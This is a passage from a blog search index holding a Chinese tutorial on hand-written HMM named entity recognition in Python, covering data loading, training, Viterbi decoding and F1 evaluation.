<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HMM实现命名实体识别（NER）任务</title>
    <link href="/2023/05/09/HMM%E5%AE%9E%E7%8E%B0%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB%EF%BC%88NER%EF%BC%89%E4%BB%BB%E5%8A%A1/"/>
    <url>/2023/05/09/HMM%E5%AE%9E%E7%8E%B0%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB%EF%BC%88NER%EF%BC%89%E4%BB%BB%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是隐马模型HMM"><a href="#什么是隐马模型HMM" class="headerlink" title="什么是隐马模型HMM"></a>什么是隐马模型HMM</h1><p>隐马尔可夫模型（Hidden Markov Model）或称作隐性马尔可夫模型，是统计模型，它用来描述一个含有隐含未知参数的马尔可夫过程。其难点是从可观察的参数中确定该过程的隐含参数。然后利用这些参数来作进一步的分析，例如模式识别。<br>隐马尔可夫模型是马尔科夫链的一种，它的状态不能直接观察到，但能通过观测向量序列观察到，每个观测向量都是通过某些概率密度分布表现为各种状态，每一个观测向量是由一个具有相应概率密度分布的状态序列产生。所以，隐马模型是一个双重随机过程——具有一定状态数的隐马尔科夫链和显示随机函数集。<br>关于隐马模型的说明介绍在网上很容易就能找到，也肯定比我讲的好，也就不再说明了。这里我贴上一篇我认为讲的非常通俗易懂的文章：<a href="https://www.cnblogs.com/skyme/p/4651331.html">一文搞懂HMM</a>。</p><h1 id="什么样的问题需要用到HMM模型"><a href="#什么样的问题需要用到HMM模型" class="headerlink" title="什么样的问题需要用到HMM模型"></a>什么样的问题需要用到HMM模型</h1><p>使用隐马模型解决的问题一般有两个特征：</p><ol><li>问题是基于序列（马尔科夫链）的，比如时间序列或者状态序列；</li><li>问题中有两类数据，一类序列数据是可以观测到的，即观测序列；另一类数据是不能观测到的，即隐藏状态序列，简称状态序列。</li></ol><p>如果一个问题满足这两个特征，那么这个问题一般可以采用HMM模型来尝试解决。这样的例子在生活中是十分常见的。比如：我在写这个实验报告的时候，在键盘上敲出的一串字符就是观测序列，而我实际上想要写下来的就是隐藏序列，而输入法就需要从我敲入的字符尽可能地猜测我想要输入的是什么，并且把可能性最大的词语放在最前面，这就可以看作一个HMM模型。这个例子是我在一篇博客上看到的，这篇博客也讲的很透彻，贴上链接：<a href="https://zhuanlan.zhihu.com/p/29938926">隐马尔可夫模型HMM</a>。</p><h1 id="Python手写HMM模型实现命名实体识别（NER）任务"><a href="#Python手写HMM模型实现命名实体识别（NER）任务" class="headerlink" title="Python手写HMM模型实现命名实体识别（NER）任务"></a>Python手写HMM模型实现命名实体识别（NER）任务</h1><h2 id="命名识别任务（Named-Entity-Recognition-NER"><a href="#命名识别任务（Named-Entity-Recognition-NER" class="headerlink" title="命名识别任务（Named Entity Recognition,NER)"></a>命名识别任务（Named Entity Recognition,NER)</h2><p>NER是指识别文本中特定意义的实体，包括人名、地名、机构名等等。命名实体识别是自然语言处理中的一个重要任务，具有广泛的应用场景，例如信息提取、问答系统、机器翻译和智能客服等。下图所示中文命名实体识别的tag，共有33个：<br><img src="/2023/05/09/HMM%E5%AE%9E%E7%8E%B0%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB%EF%BC%88NER%EF%BC%89%E4%BB%BB%E5%8A%A1/1.png" alt="image.png"><br>文本中以每一个字每单位，对应上面的任一种标签。NER任务通常被视为一个序列标注任务，也就是将输入的文本序列中的每一个单词或字符都打上对应的标签，表示其是否是一个命名实体以及其所属的类型。例如对于下面这句话：</p><blockquote><p>张建民现任上海浦东发展银行首席执行官。</p></blockquote><p>命名实体识别的任务是将其中的实体“张建民”标注为人名（PER），将“上海浦东发展银行”标注为组织机构名（ORG），将“首席执行官”标注为头衔（TITLE）。标注结果可以表示为：</p><pre><code class="hljs">张 B-NAME   建 M-NAME民 E-NAME现 O任 O上 B-ORG海 M-ORG浦 M-ORG东 M-ORG发 M-ORG展 M-ORG银 M-ORG行 E-ORG首 B-TITLE席 M-TITLE审 M-TITLE计 M-TITLE官 E-TITLE。 O</code></pre><h2 id="HMM模型的参数"><a href="#HMM模型的参数" class="headerlink" title="HMM模型的参数"></a>HMM模型的参数</h2><p>隐马模型可以用五个元素来描述，包括两个状态机和和三个概率矩阵：</p><ol><li><strong>隐含状态S</strong></li></ol><p>这些状态之间满足马尔可夫性质，是马尔可夫模型中实际所隐含的状态，无法通过直接观测而得到。例如上面提到的中文标签。隐藏状态数目记为N。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">sorted_labels_chn = [<br>    <span class="hljs-string">&#x27;O&#x27;</span>,<br>    <span class="hljs-string">&#x27;B-NAME&#x27;</span>, <span class="hljs-string">&#x27;M-NAME&#x27;</span>, <span class="hljs-string">&#x27;E-NAME&#x27;</span>, <span class="hljs-string">&#x27;S-NAME&#x27;</span><br>    , <span class="hljs-string">&#x27;B-CONT&#x27;</span>, <span class="hljs-string">&#x27;M-CONT&#x27;</span>, <span class="hljs-string">&#x27;E-CONT&#x27;</span>, <span class="hljs-string">&#x27;S-CONT&#x27;</span><br>    , <span class="hljs-string">&#x27;B-EDU&#x27;</span>, <span class="hljs-string">&#x27;M-EDU&#x27;</span>, <span class="hljs-string">&#x27;E-EDU&#x27;</span>, <span class="hljs-string">&#x27;S-EDU&#x27;</span><br>    , <span class="hljs-string">&#x27;B-TITLE&#x27;</span>, <span class="hljs-string">&#x27;M-TITLE&#x27;</span>, <span class="hljs-string">&#x27;E-TITLE&#x27;</span>, <span class="hljs-string">&#x27;S-TITLE&#x27;</span><br>    , <span class="hljs-string">&#x27;B-ORG&#x27;</span>, <span class="hljs-string">&#x27;M-ORG&#x27;</span>, <span class="hljs-string">&#x27;E-ORG&#x27;</span>, <span class="hljs-string">&#x27;S-ORG&#x27;</span><br>    , <span class="hljs-string">&#x27;B-RACE&#x27;</span>, <span class="hljs-string">&#x27;M-RACE&#x27;</span>, <span class="hljs-string">&#x27;E-RACE&#x27;</span>, <span class="hljs-string">&#x27;S-RACE&#x27;</span><br>    , <span class="hljs-string">&#x27;B-PRO&#x27;</span>, <span class="hljs-string">&#x27;M-PRO&#x27;</span>, <span class="hljs-string">&#x27;E-PRO&#x27;</span>, <span class="hljs-string">&#x27;S-PRO&#x27;</span><br>    , <span class="hljs-string">&#x27;B-LOC&#x27;</span>, <span class="hljs-string">&#x27;M-LOC&#x27;</span>, <span class="hljs-string">&#x27;E-LOC&#x27;</span>, <span class="hljs-string">&#x27;S-LOC&#x27;</span><br>]<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>可观测状态O</strong></li></ol><p>在模型中与隐含状态相关联，可通过直接观测而得到。例如所有汉字的集合。可观测状态的数目记为M。</p><ol start="3"><li><strong>初始状态概率矩阵π</strong></li></ol><p>表示隐含状态在初始时刻t&#x3D;1时的概率矩阵，大小为N。(例如t&#x3D;1时，P(S1)&#x3D;p1、P(S2)&#x3D;P2、P(S3)&#x3D;p3，则初始状态概率矩阵 π&#x3D;[ p1 p2 p3 ]）</p><ol start="4"><li><strong>隐含状态转移概率矩阵</strong></li></ol><p>描述了HMM模型中各个状态之间的转移概率，大小为N*N。其中Aij &#x3D; P( Sj | Si ),1≤i,,j≤N.表示在 t 时刻、状态为 Si 的条件下，在 t+1 时刻状态是 Sj 的概率。</p><ol start="5"><li><strong>发射概率矩阵</strong></li></ol><p>描述了从隐状态生成观测结果的过程，大小为N*M。即每种实体标签（共N种）生成不同的汉字的概率（共M个）。</p><p>因此，模型初始化如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HMM</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.obs_list = []    <span class="hljs-comment">#观测值</span><br>        self.state_list = []  <span class="hljs-comment">#状态</span><br>        self.N = <span class="hljs-number">0</span>   <span class="hljs-comment">#状态数， =len(self.state_list)</span><br>        self.M = <span class="hljs-number">0</span>   <span class="hljs-comment">#观测值数 =len(self.obs_list)</span><br>        self.initial_prob = <span class="hljs-literal">None</span>     <span class="hljs-comment">#初始状态概率矩阵</span><br>        self.transition_prob = <span class="hljs-literal">None</span>  <span class="hljs-comment">#状态转移概率矩阵</span><br>        self.emission_prob = <span class="hljs-literal">None</span>    <span class="hljs-comment">#发射概率矩阵</span><br>        self.epsilon = <span class="hljs-number">1e-8</span> <span class="hljs-comment">#偏置，防止log0或乘0</span><br></code></pre></td></tr></table></figure><p>注意到这里多出来一个偏置，先记下来，它的作用我们待会讨论。</p><h2 id="HMM模型的计算过程"><a href="#HMM模型的计算过程" class="headerlink" title="HMM模型的计算过程"></a>HMM模型的计算过程</h2><h3 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h3><p>首先我们要有标注好的训练集，训练集应该是由一系列文本和其对应的实体标注组成的。中间用空格隔开，每行一个字和一个标注。<br>我们需要读取训练集train.txt（大量的“观测结果——隐藏状态”序列），打开文件，遍历每一行。对于每行，使用split()函数将每个字符和标签分离开来，并将字符添加到obs_seq_list中，标签添加到state_seq_list中。如果字符不在观测列表obs_list中，那么它会被添加进去。同样的，如果标签不在状态列表state_list中，它也会被添加进去。注意，为了防止模型中出现未知的词语（即训练集中未出现的词语）的问题，在加载数据时将“UNK（unknown）”加入到观测状态序列中。这样，当我们在测试集中出现未知的词语，我们就用“UNK”代替。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data</span>(<span class="hljs-params">self, data_path</span>):<br>    obs_seq_list = []  <span class="hljs-comment"># 观测序列列表</span><br>    state_seq_list = []  <span class="hljs-comment"># 状态序列列表</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(data_path, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> line.strip():<br>                <span class="hljs-keyword">continue</span><br>            char, label = line.strip().split()  <span class="hljs-comment"># 按空格分隔每个字符和标签</span><br>            obs_seq_list.append(char)<br>            state_seq_list.append(label)<br>            <br>            <span class="hljs-keyword">if</span> char <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.obs_list:<br>                self.obs_list.append(char)<br>            <span class="hljs-keyword">if</span> label <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.state_list:<br>                self.state_list.append(label)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;UNK&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.obs_list:<br>        self.obs_list.append(<span class="hljs-string">&#x27;UNK&#x27;</span>)<br><br>    self.M = <span class="hljs-built_in">len</span>(self.obs_list)<br>    self.N = <span class="hljs-built_in">len</span>(self.state_list)<br><br>    <span class="hljs-keyword">return</span> obs_seq_list, state_seq_list<br></code></pre></td></tr></table></figure><h3 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h3><p>根据训练集，估计HMM的三个参数：初始概率矩阵、发射概率矩阵和状态转移概率矩阵。具体步骤如下：</p><ol><li><strong>初始化概率矩阵。</strong></li></ol><p>初始状态概率向量π，大小为N：初始状态为各个状态出现的概率，即π&#x3D;[π1, π2, …, πN]，其中，πi表示第i个标记类型的初始概率。<br>状态转移概率矩阵A，大小为N<em>N：状态转移概率矩阵A[i][j]表示从状态i转移到状态j的概率。<br>发射概率矩阵B，大小为N</em>M：发射概率矩阵B[i][j]表示从状态i生成观测结果j的概率。</p><ol start="2"><li><strong>计算初始概率。</strong></li></ol><p>使用defaultdict构建状态索引字典state_index_dict，将状态列表self.state_list中的状态和索引对应起来，然后遍历观测序列列表state_seq_list，计算每个状态出现的次数，并将次数加入到初始概率矩阵self.initial_prob中。在计算过程中，为了避免出现零概率，如果某个状态未出现在state_seq_list中，则将其概率赋为self.epsilon。最后将概率归一化，得到最终的初始概率矩阵。</p><ol start="3"><li><strong>计算状态转移矩阵。</strong></li></ol><p>遍历状态序列列表state_seq_list，统计相邻状态出现的次数，并将这些次数加入到状态转移概率矩阵self.transition_prob中。为了避免出现零概率，如果某个状态转移未出现，则将其概率赋为self.epsilon。最后将概率归一化，得到最终的状态转移概率矩阵。</p><ol start="4"><li><strong>计算发射概率矩阵。</strong></li></ol><p>遍历状态序列列表state_seq_list和观测序列列表obs_seq_list，统计每个状态对应的观测值出现的次数，并将这些次数加入到发射概率矩阵self.emission_prob中。为了避免出现零概率，如果某个观测值未出现，则将其概率赋为self.epsilon。最后将概率归一化，得到最终的发射概率矩阵。</p><ol start="5"><li><strong>概率矩阵优化。</strong></li></ol><p>为了防止概率值过小，在计算概率矩阵后，采用对数概率对概率矩阵进行优化，并使用epsilon来避免概率为零的情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">train</span>(<span class="hljs-params">self, obs_seq_list, state_seq_list</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    训练模型</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#初始化概率矩阵</span><br>    self.initial_prob = np.zeros(self.N)<br>    self.transition_prob = np.zeros((self.N, self.N))<br>    self.emission_prob = np.zeros((self.N, self.M))<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;initialize training...&quot;</span>)<br>    <span class="hljs-comment">#计算初始概率矩阵</span><br>    state_index_dict = defaultdict(<span class="hljs-built_in">int</span>)<br>    <span class="hljs-keyword">for</span> i, state <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(self.state_list):<br>        state_index_dict[state] = i<br>    <span class="hljs-keyword">for</span> state_seq <span class="hljs-keyword">in</span> state_seq_list:<br>        self.initial_prob[state_index_dict[state_seq]] += <span class="hljs-number">1</span><br>    self.initial_prob[self.initial_prob == <span class="hljs-number">0</span>] = self.epsilon<br>    self.initial_prob /= <span class="hljs-built_in">len</span>(state_seq_list)<br>    <span class="hljs-comment">#计算状态转移概率矩阵</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(state_seq_list) - <span class="hljs-number">1</span>):<br>        curr_state = state_index_dict[state_seq_list[i]]<br>        next_state = state_index_dict[state_seq_list[i + <span class="hljs-number">1</span>]]<br>        self.transition_prob[curr_state][next_state] += <span class="hljs-number">1</span><br>    <span class="hljs-comment">#计算发射概率矩阵</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(state_seq_list)):<br>        state = state_index_dict[state_seq_list[i]]<br>        obs = self.obs_list.index(obs_seq_list[i])<br>        self.emission_prob[state][obs] += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.N):<br>        self.transition_prob[i][self.transition_prob[i] == <span class="hljs-number">0</span>] = self.epsilon<br>        self.emission_prob[i][self.emission_prob[i] == <span class="hljs-number">0</span>] = self.epsilon<br>        self.transition_prob[i] = self.transition_prob[i] / <span class="hljs-built_in">sum</span>(self.transition_prob[i])<br>        self.emission_prob[i] = self.emission_prob[i] / <span class="hljs-built_in">sum</span>(self.emission_prob[i])<br><br>    self.initial_prob = np.log(self.initial_prob)<br>    self.transition_prob = np.log(self.transition_prob)<br>    self.emission_prob = np.log(self.emission_prob)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;DONE!&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="模型解码"><a href="#模型解码" class="headerlink" title="模型解码"></a>模型解码</h3><p>利用viterbi算法对测试集中的句子进行解码，得到最可能的实体标注序列。该函数的输入是一个观测序列obs_seq，输出是一个状态序列state_seq，表示观测序列obs_seq下，模型最可能的隐藏状态序列。<br>我们需要准备两个矩阵，delta和psi。delta[t][j]表示在时刻t，隐藏状态为j且观测序列为obs_seq[:t+1]时的最大概率。psi[t][j]表示在时刻t，隐藏状态为j且观测序列为obs_seq[:t+1]时的最大概率所对应的前一时刻的隐藏状态。<br>首先，我们根据初始概率矩阵和发射概率矩阵计算得到两个矩阵的第一列，然后通过循环计算其他列。最后根据回溯方法找出最佳路径，并将路径对应的状态序列返回。<br>值得注意的是，由于我们在训练的时候对所有的概率都取了对数，所以在矩阵计算的时候对应的乘法都转换为了加法。对概率取对数的好处是可以避免数值下溢问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">viterbi</span>(<span class="hljs-params">self, obs_seq</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    维特比解码算法</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    T = <span class="hljs-built_in">len</span>(obs_seq)<br>    delta = np.zeros((T, self.N))<br>    psi = np.zeros((T, self.N))<br><br>    <span class="hljs-comment"># 初始化 delta 和 psi 的第一列</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.N):<br>        delta[<span class="hljs-number">0</span>][i] = self.initial_prob[i] + self.emission_prob[i][obs_seq[<span class="hljs-number">0</span>]]<br>        psi[<span class="hljs-number">0</span>][i] = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># 计算 delta 和 psi 的其他列</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, T):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.N):<br>            max_delta = <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;-inf&#x27;</span>) <span class="hljs-comment">#前一时刻状态转移的最大概率值</span><br>            max_index = <span class="hljs-literal">None</span> <span class="hljs-comment">#最大概率所对应的前一时刻隐藏状态</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.N):<br>                prob = delta[t - <span class="hljs-number">1</span>][i] + self.transition_prob[i][j]<br>                <span class="hljs-keyword">if</span> prob &gt; max_delta:<br>                    max_delta = prob<br>                    max_index = i<br>            delta[t][j] = max_delta + self.emission_prob[j][obs_seq[t]]<br>            psi[t][j] = max_index<br><br>    <span class="hljs-comment"># 回溯找出最佳路径</span><br>    state_seq = np.zeros(T, dtype=<span class="hljs-built_in">int</span>) <span class="hljs-comment"># 最优路径序列</span><br>    state_seq[T - <span class="hljs-number">1</span>] = np.argmax(delta[T - <span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(T - <span class="hljs-number">2</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        state_seq[t] = psi[t + <span class="hljs-number">1</span>][state_seq[t + <span class="hljs-number">1</span>]]<br><br>    <span class="hljs-keyword">return</span> [self.state_list[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> state_seq]<br></code></pre></td></tr></table></figure><h3 id="模型测试"><a href="#模型测试" class="headerlink" title="模型测试"></a>模型测试</h3><p>测试集形式是和训练集一样的，我们需要按行处理每一个测试样例，从中提取出观测序列。对于每一个测试样例，将其转换为一个观测序列，其中每个观测值表示一个字符在字典中的索引，如果字符不在字典中，则将其索引设置为 UNK 字符的索引。使用维特比算法对观测序列进行预测，得到一个状态序列，其中每个状态表示一个标签在字典中的索引。根据预测的标注序列我们生成一个与源文件类似的文件，只是将每个观测样例的实际标注替换为我们根据viterbi解码得到的预测标注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">predict</span>(<span class="hljs-params">self, test_file, output_file</span>):<br>    obs_seq_list = []   <span class="hljs-comment">#观测序列列表</span><br>    state_seq_list = [] <span class="hljs-comment">#状态序列列表</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(test_file, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        test_lines = f.readlines()<br>    <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> test_lines:<br>            line = line.strip()<br>            <span class="hljs-keyword">if</span> line:<br>                char, label = line.split()<br>                <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> self.obs_list:<br>                    obs_seq_list.append(self.obs_list.index(char))<br>                <span class="hljs-keyword">else</span>:<br>                    obs_seq_list.append(self.obs_list.index(<span class="hljs-string">&quot;UNK&quot;</span>))<br>                state_seq_list.append(label)<br>        <br>        pred_state_seq_list = self.viterbi(obs_seq_list)<br><br>        i = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> test_lines:<br>            line = line.strip()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> line:<br>                f.write(<span class="hljs-string">&quot;\n&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                char, __ = line.split()<br>                f.write(char + <span class="hljs-string">&quot; &quot;</span> + pred_state_seq_list[i] + <span class="hljs-string">&quot;\n&quot;</span>)<br>                i += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="调用模型"><a href="#调用模型" class="headerlink" title="调用模型"></a>调用模型</h3><p>调用模型分别对中文和英文数据进行训练和预测，得到生成文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    hmm = HMM()<br>    train_path = <span class="hljs-string">&quot;Project2/NER/Chinese/train.txt&quot;</span><br>    <span class="hljs-comment">#train_path = &quot;Project2/NER/English/train.txt&quot;</span><br>    validation_path = <span class="hljs-string">&quot;Project2/NER/Chinese/validation.txt&quot;</span><br>    <span class="hljs-comment">#validation_path = &quot;Project2/NER/English/validation.txt&quot;</span><br>    my_path = <span class="hljs-string">&quot;my_pred_Chinese.txt&quot;</span><br>    <span class="hljs-comment">#my_path = &quot;my_pred_English.txt&quot;</span><br>    <br>    obs_seq_list, state_seq_list = hmm.load_data(train_path)<br>    hmm.train(obs_seq_list, state_seq_list)<br>    hmm.predict(validation_path,my_path)<br></code></pre></td></tr></table></figure><p>然后，将测试文件和生成文件进行对比，得到模型的f1-score。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> metrics<br><span class="hljs-keyword">import</span> warnings<br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>)<br><br>sorted_labels_eng= [<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;B-PER&quot;</span>, <span class="hljs-string">&quot;I-PER&quot;</span>, <span class="hljs-string">&quot;B-ORG&quot;</span>, <span class="hljs-string">&quot;I-ORG&quot;</span>, <span class="hljs-string">&quot;B-LOC&quot;</span>, <span class="hljs-string">&quot;I-LOC&quot;</span>, <span class="hljs-string">&quot;B-MISC&quot;</span> , <span class="hljs-string">&quot;I-MISC&quot;</span>]<br><br>sorted_labels_chn = [<br><span class="hljs-string">&#x27;O&#x27;</span>,<br><span class="hljs-string">&#x27;B-NAME&#x27;</span>, <span class="hljs-string">&#x27;M-NAME&#x27;</span>, <span class="hljs-string">&#x27;E-NAME&#x27;</span>, <span class="hljs-string">&#x27;S-NAME&#x27;</span><br>, <span class="hljs-string">&#x27;B-CONT&#x27;</span>, <span class="hljs-string">&#x27;M-CONT&#x27;</span>, <span class="hljs-string">&#x27;E-CONT&#x27;</span>, <span class="hljs-string">&#x27;S-CONT&#x27;</span><br>, <span class="hljs-string">&#x27;B-EDU&#x27;</span>, <span class="hljs-string">&#x27;M-EDU&#x27;</span>, <span class="hljs-string">&#x27;E-EDU&#x27;</span>, <span class="hljs-string">&#x27;S-EDU&#x27;</span><br>, <span class="hljs-string">&#x27;B-TITLE&#x27;</span>, <span class="hljs-string">&#x27;M-TITLE&#x27;</span>, <span class="hljs-string">&#x27;E-TITLE&#x27;</span>, <span class="hljs-string">&#x27;S-TITLE&#x27;</span><br>, <span class="hljs-string">&#x27;B-ORG&#x27;</span>, <span class="hljs-string">&#x27;M-ORG&#x27;</span>, <span class="hljs-string">&#x27;E-ORG&#x27;</span>, <span class="hljs-string">&#x27;S-ORG&#x27;</span><br>, <span class="hljs-string">&#x27;B-RACE&#x27;</span>, 